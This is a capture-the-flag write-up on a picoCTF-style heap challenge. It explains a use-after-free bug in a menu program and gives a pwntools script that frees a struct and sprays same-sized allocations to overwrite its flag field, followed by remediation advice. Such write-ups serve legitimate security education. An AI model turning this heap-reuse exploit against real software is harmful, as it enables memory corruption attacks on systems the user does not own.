## Context

Upon execution, the given executable prompts the user for one of 6 choices in a loop:
1. Print the address and value of `x->flag` where `x` is a struct defined as follows:

```c
typedef struct {
	char a[10];
	char b[10];
	char c[10];
	char flag[5];
} object;

object *x;
```

2. Allocate a heap buffer of any desired size and fill it with an arbitrary value
3. Print the value of `x->flag`
4. Check if the win condition is met, that is, the value of `x->flag` is the string `"pico"`. If this is the case, the actual CTF flag is read from disk and printed.
5. Free `x`
6. Exit the program

Note that before prompting the user, the program allocates `x` on the heap using `malloc` and sets the value of `x->flag` to `"bico"`.

The goal of the challenge is to manipulate the value of `x->flag` without any direct way of doing so.

## Vulnerability

The main vulnerability is that the win condition can still be checked after `x` is free'd. If we run option 5 (free) and then option 4 (check win), the program reads unallocated memory. Additionally, by giving us the option to allocate and set our own block on the heap, there is a chance that the memory allocator will place the new block where `x` used to be, thus giving us control over the value of `x->flag`.

## Exploit

To maximize the chances of a new block being placed where `x` used to be, we should allocate a block of the same size. Since this struct only contains characters, each taking up one byte, the total size is `3*10+5=35` bytes.

The first 30 bytes of the struct do not matter for this challenge, so we can just write A's. The next 4 should be `pico` followed by the null terminator.

Even if matching the size increases the chance, the placement is unlikely to match on the first try. We should therefore repeat the operation many times.

We can automate this using [pwntools](https://docs.pwntools.com/en/stable/) in Python:

```python
from pwn import *

# chall = process("./chall") # For local testing
chall = remote("tethys.picoctf.net", 57592) # Challenge server

# Select option 5: Free object
chall.sendline(b"5")

# Keep allocating 35 bytes
for i in range(100):
    chall.sendline(b"2") # Select option 2: Allocate on heap
    chall.sendline(b"35") # Size of allocation
    chall.send(b"A" * 30)
    chall.sendline(b"pico\0")

chall.interactive()
```

After repeating the operation 100 times, the script returns standard I/O to us letting us print the value of `x->flag` to confirm our data is now present there, before running the victory check and obtaining our flag.

## Remediation

To prevent this vulnerability, the program should never read memory that is unallocated. One option could be to reallocate the object after it is free'd, or simply stop the program after it is free'd. Additionally, letting the user perform arbitrary allocations with no constraints should also be avoided.